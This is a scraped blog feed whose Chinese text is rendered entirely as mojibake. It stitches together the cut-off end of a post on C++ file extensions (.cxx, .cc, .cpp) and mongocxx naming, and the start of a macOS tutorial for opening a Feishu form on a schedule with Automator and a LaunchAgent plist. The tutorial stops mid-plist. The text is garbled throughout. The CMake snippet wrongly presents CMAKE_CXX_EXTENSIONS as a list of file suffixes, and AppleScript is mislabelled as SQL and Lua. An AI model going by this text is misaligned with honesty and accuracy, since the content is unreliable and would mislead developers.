<p>ä¸ºäº†é¿å…ä¸é¢„å¤„ç†å™¨å†²çªï¼ŒC++ç¤¾åŒºå‡ºç°äº†å¤šç§æ–‡ä»¶æ‰©å±•åï¼š</p>
<h4 data-id="heading-6">å„æ´¾ç³»ä¹‹äº‰</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 1. .cpp æ´¾ (ç°åœ¨çš„ä¸»æµ)</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-comment">// å¤šæ•°ç°ä»£IDEå’Œæ„å»ºç³»ç»Ÿé¦–é€‰</span>

<span class="hljs-comment">// 2. .cxx æ´¾ (mongocxxçš„é€‰æ‹©)  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mongocxx/client.hpp&gt;</span></span>
<span class="hljs-comment">// å¸¸è§äºè€ç‰Œé¡¹ç›®å’ŒUnixä¼ ç»Ÿ</span>

<span class="hljs-comment">// 3. .cc æ´¾ (Googleé£æ ¼)</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"base/logging.h"</span></span>
<span class="hljs-comment">// Googleå†…éƒ¨ä»£ç è§„èŒƒè¦æ±‚</span>

<span class="hljs-comment">// 4. å…¶ä»–å˜ä½“</span>
file.C     <span class="hljs-comment">// åŒºåˆ†å¤§å°å†™çš„ç³»ç»Ÿ</span>
file.c++   <span class="hljs-comment">// è¾ƒå°‘ä½¿ç”¨</span>
</code></pre>
<h4 data-id="heading-7">ç¼–è¯‘å™¨çš„å…¼å®¹æ€§</h4>
<p>å„å¤§ç¼–è¯‘å™¨éƒ½å¯¹å„ç§æ‰©å±•åæä¾›äº†æ”¯æŒï¼š</p>
<pre><code class="hljs language-bash" lang="bash">g++ -c file.cxx        <span class="hljs-comment"># ç¼–è¯‘.cxxæ–‡ä»¶</span>
g++ -c file.cc         <span class="hljs-comment"># ç¼–è¯‘.ccæ–‡ä»¶  </span>
clang++ -c file.cpp    <span class="hljs-comment"># ç¼–è¯‘.cppæ–‡ä»¶</span>
</code></pre>
<h3 data-id="heading-8">mongocxxçš„å‘½åé€»è¾‘</h3>
<h4 data-id="heading-9">ä¿æŒå†å²ä¸€è‡´æ€§</h4>
<p>MongoDBé©±åŠ¨éµå¾ªäº†ä¼ ç»Ÿçš„å‘½åè§„èŒƒï¼š</p>
<pre><code class="hljs language-scss" lang="scss">mongoc     â†’ Cè¯­è¨€é©±åŠ¨ (åŸºç¡€å±‚)
â””â”€â”€ mongocxx â†’ C++é©±åŠ¨ (åŸºäºCé©±åŠ¨çš„å°è£…)
</code></pre>
<h4 data-id="heading-10">é¡¹ç›®ç»“æ„ä½“ç°</h4>
<pre><code class="hljs language-bash" lang="bash">mongocxx/
â”œâ”€â”€ src/mongocxx/  <span class="hljs-comment"># C++å¤´æ–‡ä»¶ä½¿ç”¨.hpp</span>
â”‚   â””â”€â”€ client.hpp
â”œâ”€â”€ <span class="hljs-built_in">test</span>/          <span class="hljs-comment"># æµ‹è¯•ä»£ç å¯èƒ½ä½¿ç”¨.cxx</span>
â”‚   â””â”€â”€ test_client.cxx
â””â”€â”€ CMakeLists.txt <span class="hljs-comment"># æ„å»ºé…ç½®å¤„ç†å„ç§æ‰©å±•å</span>
</code></pre>
<h3 data-id="heading-11">ç°ä»£å¼€å‘ä¸­çš„ç°çŠ¶</h3>
<h4 data-id="heading-12">ç°çŠ¶åˆ†æ</h4>
<p>è™½ç„¶<code>.cpp</code>å·²æˆä¸ºäº‹å®ä¸Šçš„ä¸»æµæ ‡å‡†ï¼Œä½†å¾ˆå¤šå†å²æ‚ ä¹…çš„é¡¹ç›®ä»ç„¶ä¿æŒä¼ ç»Ÿï¼š</p>

























<table><thead><tr><th>é¡¹ç›®ç±»å‹</th><th>å¸¸ç”¨æ‰©å±•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æ–°å¯åŠ¨é¡¹ç›®</td><td>.cpp</td><td>ç°ä»£IDEå’Œæ„å»ºç³»ç»Ÿå‹å¥½</td></tr><tr><td>è€ç‰Œåº“é¡¹ç›®</td><td>.cxx/.cc</td><td>ä¿æŒå†å²ä¸€è‡´æ€§</td></tr><tr><td>Googleç›¸å…³</td><td>.cc</td><td>éµå¾ªå†…éƒ¨ä»£ç è§„èŒƒ</td></tr></tbody></table>
<h4 data-id="heading-13">æ„å»ºç³»ç»Ÿçš„é€‚åº”æ€§</h4>
<p>ç°ä»£æ„å»ºç³»ç»Ÿéƒ½èƒ½æ­£ç¡®å¤„ç†å„ç§æ‰©å±•åï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeè‡ªåŠ¨è¯†åˆ«æ‰€æœ‰C++æ‰©å±•å
add_library(mongocxx 
    src/file1.cxx
    src/file2.cpp  
    src/file3.cc
)

# æˆ–è€…æ˜ç¡®æŒ‡å®š
set(CMAKE_CXX_EXTENSIONS .cxx .cpp .cc)
</code></pre>
<h3 data-id="heading-14">å®è·µå»ºè®®</h3>
<h4 data-id="heading-15">å¯¹äºæ–°é¡¹ç›®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¨èä½¿ç”¨.cppï¼Œå› ä¸ºï¼š</span>
<span class="hljs-comment"># 1. æ›´å¹¿æ³›çš„å·¥å…·æ”¯æŒ</span>
<span class="hljs-comment"># 2. æ›´ç›´è§‚çš„å‘½å</span>
<span class="hljs-comment"># 3. ç¤¾åŒºä¸»æµé€‰æ‹©</span>
my_program.cpp
</code></pre>
<h4 data-id="heading-16">ç†è§£è€é¡¹ç›®</h4>
<p>å½“ä½ é‡åˆ°<code>.cxx</code>æ‰©å±•åæ—¶ï¼Œç°åœ¨åº”è¯¥æ˜ç™½ï¼š</p>
<ul>
<li>è¿™ä¸æ˜¯æ ‡æ–°ç«‹å¼‚ï¼Œè€Œæ˜¯å†å²ä¼ æ‰¿</li>
<li>ä¸å½±å“ä»£ç åŠŸèƒ½å’Œæ€§èƒ½</li>
<li>æ„å»ºå·¥å…·éƒ½èƒ½æ­£å¸¸å¤„ç†</li>
</ul>
<h3 data-id="heading-17">ç»“è¯­</h3>
<p><code>mongocxx</code>çš„å‘½åé€‰æ‹©åæ˜ äº†C++è¯­è¨€çš„æ¼”è¿›å†å²ã€‚ä»ä»Šå¤©çš„è§†è§’çœ‹ï¼Œ<code>.cxx</code>å¯èƒ½æ˜¾å¾—æœ‰äº›"è€æ´¾"ï¼Œä½†å®ƒæ‰¿è½½äº†C++ä»Unixå®éªŒå®¤èµ°å‘å…¨ä¸–ç•Œçš„å®Œæ•´å†ç¨‹ã€‚</p>
<p>è¿™ç§å‘½åä¸Šçš„å¤šæ ·æ€§ï¼Œæ°æ°ä½“ç°äº†C++ç”Ÿæ€çš„ä¸°å¯Œæ€§å’Œå…¼å®¹æ€§â€”â€”æ— è®ºæ˜¯ç°ä»£çš„<code>.cpp</code>è¿˜æ˜¯ä¼ ç»Ÿçš„<code>.cxx</code>ï¼Œéƒ½èƒ½åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­å’Œè°å…±å­˜ï¼Œå…±åŒæ„å»ºå¼ºå¤§çš„è½¯ä»¶ç³»ç»Ÿã€‚</p>
<p>æ‰€ä»¥ä¸‹æ¬¡çœ‹åˆ°<code>.cxx</code>æ‰©å±•åæ—¶ï¼Œä½ ä¸å¿…å›°æƒ‘ï¼Œåªéœ€ä¼šå¿ƒä¸€ç¬‘ï¼šè¿™æ˜¯ä¸€ä¸ªç»å†è¿‡C++"æˆ˜å›½æ—¶ä»£"çš„è€å…µã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Mac è‡ªåŠ¨å®šæ—¶æ‰“å¼€æŒ‡å®šURLï¼ˆæ— æ—¥å†ç‰ˆï¼‰æ“ä½œæ–‡æ¡£]]></title>    <link>https://juejin.cn/post/7576894778572849187</link>    <guid>https://juejin.cn/post/7576894778572849187</guid>    <pubDate>2025-11-27T02:20:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576894778572849187" data-draft-id="7576929700841275401" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Mac è‡ªåŠ¨å®šæ—¶æ‰“å¼€æŒ‡å®šURLï¼ˆæ— æ—¥å†ç‰ˆï¼‰æ“ä½œæ–‡æ¡£"/> <meta itemprop="keywords" content="macOS"/> <meta itemprop="datePublished" content="2025-11-27T02:20:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å­¦ä¹ éæš´åŠ›æ²Ÿé€šçš„ç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/4183005583377070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Mac è‡ªåŠ¨å®šæ—¶æ‰“å¼€æŒ‡å®šURLï¼ˆæ— æ—¥å†ç‰ˆï¼‰æ“ä½œæ–‡æ¡£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4183005583377070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å­¦ä¹ éæš´åŠ›æ²Ÿé€šçš„ç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T02:20:59.000Z" title="Thu Nov 27 2025 02:20:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æä¾›çš„å†…å®¹æœ¬èº«å·²é‡‡ç”¨ Markdown è¯­æ³•æ’°å†™ï¼Œæˆ‘å·²å¯¹æ ¼å¼è¿›è¡Œäº†ç»†å¾®ä¼˜åŒ–ï¼ˆå¦‚ç»Ÿä¸€ä»£ç å—æ ·å¼ã€ç¡®ä¿æ ‡é¢˜å±‚çº§ä¸€è‡´æ€§ï¼‰ï¼Œä»¥ä¸‹æ˜¯å¯ç›´æ¥ä½¿ç”¨çš„å®Œæ•´ Markdown æ–‡æ¡£ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># Mac è‡ªåŠ¨å®šæ—¶æ‰“å¼€æŒ‡å®šURLï¼ˆæ— æ—¥å†ç‰ˆï¼‰æ“ä½œæ–‡æ¡£</span>
<span class="hljs-section">## ä¸€ã€æ“ä½œç›®æ ‡</span>
æ— éœ€ä¾èµ–æ—¥å†ï¼Œé€šè¿‡ Mac è‡ªå¸¦ã€Œè‡ªåŠ¨æ“ä½œã€+ã€ŒLaunchAgentã€ï¼Œå®ç°æ¯å¤© <span class="hljs-strong">**9:00ã€10:00ã€11:00ã€14:00ã€15:00ã€16:00ã€17:00**</span> è‡ªåŠ¨ç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€ç›®æ ‡é£ä¹¦é“¾æ¥ï¼š<span class="hljs-code">`https://hav4xarv6k.feishu.cn/share/base/form/shrcnRbIxP9bnHct1X1aCiKjYyc`</span>


<span class="hljs-section">## äºŒã€å‰ç½®å‡†å¤‡</span>
<span class="hljs-bullet">1.</span> ç¡®è®¤ Mac ç™»å½•ç”¨æˆ·åï¼šæ‰“å¼€ã€Œç³»ç»Ÿè®¾ç½®ã€â†’ã€Œç”¨æˆ·ä¸ç¾¤ç»„ã€ï¼Œè®°å½•å½“å‰ç”¨æˆ·åï¼ˆç¤ºä¾‹ä¸­ç”¨æˆ·åä¸º <span class="hljs-code">`lixing`</span>ï¼Œåç»­éœ€æ›¿æ¢ä¸ºä½ çš„å®é™…ç”¨æˆ·åï¼‰ã€‚
<span class="hljs-bullet">2.</span> ç¡®ä¿ç›®æ ‡æµè§ˆå™¨ä¸ºç³»ç»Ÿé»˜è®¤ï¼šæ‰“å¼€ã€Œç³»ç»Ÿè®¾ç½®ã€â†’ã€Œé€šç”¨ã€â†’ã€Œé»˜è®¤ç½‘é¡µæµè§ˆå™¨ã€ï¼Œé€‰æ‹©å¸¸ç”¨æµè§ˆå™¨ï¼ˆå¦‚ Safariã€Chromeï¼‰ã€‚


<span class="hljs-section">## ä¸‰ã€å…³é”®å‰ç½®ï¼šæ‰“å¼€ Mac éšè—çš„ã€Œèµ„æºåº“ï¼ˆLibraryï¼‰ã€</span>
Mac ä¸­çš„ã€Œèµ„æºåº“ï¼ˆLibraryï¼‰ã€æ˜¯æ ¸å¿ƒæ–‡ä»¶å¤¹ï¼Œå­˜æ”¾è„šæœ¬ã€é…ç½®æ–‡ä»¶ç­‰å…³é”®å†…å®¹ï¼Œé»˜è®¤éšè—ã€‚åç»­æ­¥éª¤éœ€å¤šæ¬¡ç”¨åˆ°ï¼Œä»¥ä¸‹æ˜¯ 2 ç§å¸¸ç”¨æ‰“å¼€æ–¹å¼ï¼š

<span class="hljs-section">### æ–¹å¼1ï¼šé€šè¿‡ã€Œå‰å¾€æ–‡ä»¶å¤¹ã€ç›´æ¥è·³è½¬ï¼ˆæœ€å¿«ï¼‰</span>
<span class="hljs-bullet">1.</span> æ‰“å¼€ã€ŒFinderã€ï¼ˆç‚¹å‡»æ¡Œé¢åº•éƒ¨ Dock æ çš„è“è‰²ç¬‘è„¸å›¾æ ‡ï¼‰ã€‚
<span class="hljs-bullet">2.</span> æŒ‰å¿«æ·é”® <span class="hljs-strong">**Command + Shift + G**</span>ï¼Œå¼¹å‡ºã€Œå‰å¾€æ–‡ä»¶å¤¹ã€å¯¹è¯æ¡†ã€‚
<span class="hljs-bullet">3.</span> è¾“å…¥ç›®æ ‡è·¯å¾„ï¼ˆæ ¹æ®éœ€æ±‚é€‰æ‹©ï¼‰ï¼š
<span class="hljs-bullet">   -</span> æ‰“å¼€ã€Œç”¨æˆ·èµ„æºåº“ã€ï¼ˆåç»­ä¸»è¦ç”¨æ­¤è·¯å¾„ï¼‰ï¼šè¾“å…¥ <span class="hljs-code">`~/Library`</span>ï¼Œç‚¹å‡»ã€Œå‰å¾€ã€ã€‚
<span class="hljs-bullet">   -</span> æ‰“å¼€ã€Œç³»ç»Ÿèµ„æºåº“ã€ï¼ˆæå°‘ç”¨åˆ°ï¼‰ï¼šè¾“å…¥ <span class="hljs-code">`/Library`</span>ï¼Œç‚¹å‡»ã€Œå‰å¾€ã€ã€‚
<span class="hljs-bullet">4.</span> å¯¹è¯æ¡†ä¼šç›´æ¥è·³è½¬åˆ°å¯¹åº”çš„ã€Œèµ„æºåº“ã€æ–‡ä»¶å¤¹ï¼Œæ— éœ€æ‰‹åŠ¨æŸ¥æ‰¾ã€‚

<span class="hljs-section">### æ–¹å¼2ï¼šé€šè¿‡ç»ˆç«¯å‘½ä»¤æ‰“å¼€ï¼ˆé€‚åˆä¹ æƒ¯ç”¨ç»ˆç«¯çš„ç”¨æˆ·ï¼‰</span>
<span class="hljs-bullet">1.</span> æ‰“å¼€ã€Œç»ˆç«¯ã€ï¼ˆé€šè¿‡ Spotlight æœç´¢â€œç»ˆç«¯â€å¯åŠ¨ï¼Œæˆ–åœ¨ã€Œåº”ç”¨ç¨‹åºâ†’å®ç”¨å·¥å…·ã€ä¸­æ‰¾åˆ°ï¼‰ã€‚
<span class="hljs-bullet">2.</span> è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ˆæ‰“å¼€ç”¨æˆ·èµ„æºåº“ï¼‰ï¼ŒæŒ‰å›è½¦ï¼š
   <span class="hljs-code">```bash
   open ~/Library
</span></code></pre>
<ol start="3">
<li>ç³»ç»Ÿä¼šè‡ªåŠ¨å¼¹å‡ºã€Œèµ„æºåº“ã€æ–‡ä»¶å¤¹çª—å£ï¼Œç›´æ¥æ“ä½œå³å¯ã€‚</li>
</ol>
<h2 data-id="heading-0">å››ã€è¯¦ç»†æ“ä½œæ­¥éª¤</h2>
<h3 data-id="heading-1">æ­¥éª¤ 1ï¼šç”¨ã€Œè‡ªåŠ¨æ“ä½œã€åˆ›å»º â€œæ‰“å¼€ URLâ€ å·¥ä½œæµç¨‹</h3>
<ol>
<li>
<p>æ‰“å¼€ã€Œè‡ªåŠ¨æ“ä½œã€ï¼šé€šè¿‡ Spotlight æœç´¢ï¼ˆæŒ‰ <code>Command+ç©ºæ ¼</code>ï¼Œè¾“å…¥ â€œè‡ªåŠ¨æ“ä½œâ€ï¼‰å¯åŠ¨ï¼Œæˆ–åœ¨ã€Œåº”ç”¨ç¨‹åºâ†’å®ç”¨å·¥å…·ã€ä¸­æ‰¾åˆ°å¹¶æ‰“å¼€ã€‚</p>
</li>
<li>
<p>æ–°å»ºå·¥ä½œæµç¨‹ï¼šç‚¹å‡»ã€Œæ–°å»ºã€ï¼Œé€‰æ‹©ã€Œå·¥ä½œæµç¨‹ã€æ¨¡æ¿ï¼Œç‚¹å‡»ã€Œé€‰å–ã€ã€‚</p>
</li>
<li>
<p>æ·»åŠ  â€œè¿è¡Œ AppleScriptâ€ æ“ä½œï¼š</p>
<ol>
<li>
<p>åœ¨å·¦ä¾§ã€Œæ“ä½œåº“ã€æœç´¢æ è¾“å…¥ â€œè¿è¡Œ AppleScriptâ€ï¼Œå°†è¯¥æ“ä½œæ‹–åˆ°å³ä¾§ç©ºç™½å·¥ä½œåŒºã€‚</p>
</li>
<li>
<p>åˆ é™¤æ“ä½œä¸­çš„é»˜è®¤ä»£ç ï¼Œç²˜è´´ä»¥ä¸‹ä»£ç ï¼ˆç›´æ¥å†…åµŒæ‰“å¼€ URL é€»è¾‘ï¼‰ï¼š</p>
<ul>
<li>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç›®æ ‡é£ä¹¦URLï¼ˆæ— éœ€ä¿®æ”¹ï¼‰</span>
<span class="hljs-keyword">set</span> targetURL <span class="hljs-keyword">to</span> "https://hav4xarv6k.feishu.cn/share/base/form/shrcnRbIxP9bnHct1X1aCiKjYyc"
<span class="hljs-comment">-- ç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€é“¾æ¥</span>
<span class="hljs-keyword">open</span> location targetURL
<span class="hljs-comment">-- å¼¹å‡ºæ‰§è¡Œæç¤ºï¼ˆå¯é€‰ï¼Œä¸æƒ³æ˜¾ç¤ºå¯åˆ é™¤è¿™ä¸¤è¡Œï¼‰</span>
display notification "å·²è‡ªåŠ¨æ‰“å¼€é£ä¹¦éœ€æ±‚è¡¨" <span class="hljs-keyword">with</span> title "å®šæ—¶ä»»åŠ¡å®Œæˆ" sound name "default"
</code></pre>
</li>
</ul>
</li>
<li>
<p>ï¼ˆå¯é€‰ï¼‰æŒ‡å®š Chrome æµè§ˆå™¨ï¼šè‹¥éœ€ç”¨ Chrome æ‰“å¼€ï¼Œå°†ä¸Šè¿°ä»£ç ä¸­ â€œç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€é“¾æ¥â€ çš„è¡Œæ›¿æ¢ä¸ºï¼š</p>
<ul>
<li>
<pre><code class="hljs language-lua" lang="lua">tell application <span class="hljs-string">"/Applications/Google Chrome.app"</span>
    <span class="hljs-built_in">open</span> location targetURL
    activate <span class="hljs-comment">-- è‡ªåŠ¨æ¿€æ´»æµè§ˆå™¨çª—å£</span>
<span class="hljs-keyword">end</span> tell
</code></pre>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>ä¿å­˜å·¥ä½œæµç¨‹ï¼š</p>
<ol>
<li>æŒ‰ <code>Command+S</code>ï¼Œé€šè¿‡ã€Œä¸‰ã€å…³é”®å‰ç½®ã€ä¸­çš„æ–¹æ³•æ‰“å¼€ã€Œç”¨æˆ·èµ„æºåº“ï¼ˆ~/Libraryï¼‰ã€ã€‚</li>
<li>è¿›å…¥ <code>Libraryâ†’Scripts</code> æ–‡ä»¶å¤¹ï¼ˆè‹¥æ²¡æœ‰ <code>Scripts</code> æ–‡ä»¶å¤¹ï¼Œå³é”®ç©ºç™½å¤„é€‰æ‹©ã€Œæ–°å»ºæ–‡ä»¶å¤¹ã€ï¼Œå‘½åä¸º <code>Scripts</code>ï¼‰ã€‚</li>
<li>æ–‡ä»¶åè¾“å…¥ <code>OpenFeishuURL.workflow</code>ï¼ˆåç¼€å¿…é¡»ä¸º <code>.workflow</code>ï¼Œä¸å¯ä¿®æ”¹ï¼‰ï¼Œç‚¹å‡»ã€Œå­˜å‚¨ã€ã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-2">æ­¥éª¤ 2ï¼šåˆ›å»ºã€ŒLaunchAgentã€å®šæ—¶é…ç½®æ–‡ä»¶ï¼ˆplistï¼‰</h3>
<ol>
<li>
<p>æ‰“å¼€ã€Œæ–‡æœ¬ç¼–è¾‘ã€ï¼šé€šè¿‡ Spotlight æœç´¢å¯åŠ¨ï¼Œæˆ–åœ¨ã€Œåº”ç”¨ç¨‹åºã€ä¸­æ‰¾åˆ°å¹¶æ‰“å¼€ã€‚</p>
</li>
<li>
<p>åˆ‡æ¢çº¯æ–‡æœ¬æ ¼å¼ï¼šç‚¹å‡»é¡¶éƒ¨èœå•æ ã€Œæ ¼å¼ã€â†’ã€Œåˆ¶ä½œçº¯æ–‡æœ¬ã€ï¼ˆå¿…é¡»åˆ‡æ¢ï¼Œå¦åˆ™é…ç½®æ–‡ä»¶æ— æ•ˆï¼‰ã€‚</p>
</li>
<li>
<p>ç²˜è´´é…ç½®ä»£ç ï¼šå¤åˆ¶ä»¥ä¸‹ XML ä»£ç ï¼Œç²˜è´´åˆ°æ–‡æœ¬ç¼–è¾‘ä¸­ï¼Œ<strong>å…³é”®ä¿®æ”¹ â€œç”¨æˆ·åâ€</strong> ï¼ˆå°† <code>lixing</code> æ›¿æ¢ä¸ºä½ çš„å®é™…ç”¨æˆ·åï¼‰ï¼š</p>
<ol>
<li>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">plist</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Apple//DTD PLIST 1.0//EN"</span> <span class="hljs-string">"http://www.apple.com/DTDs/PropertyList-1.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">plist</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- ä»»åŠ¡å”¯ä¸€æ ‡è¯†ï¼ˆæ— éœ€ä¿®æ”¹ï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.user.OpenFeishuURL<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- æ‰§è¡Œå‘½ä»¤ï¼šè°ƒç”¨è‡ªåŠ¨æ“ä½œçš„å·¥ä½œæµç¨‹ï¼ˆæ›¿æ¢ç”¨æˆ·åï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>ProgramArguments<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/usr/bin/automator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/Users/lixing/Library/Scripts/OpenFeishuURL.workflow<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
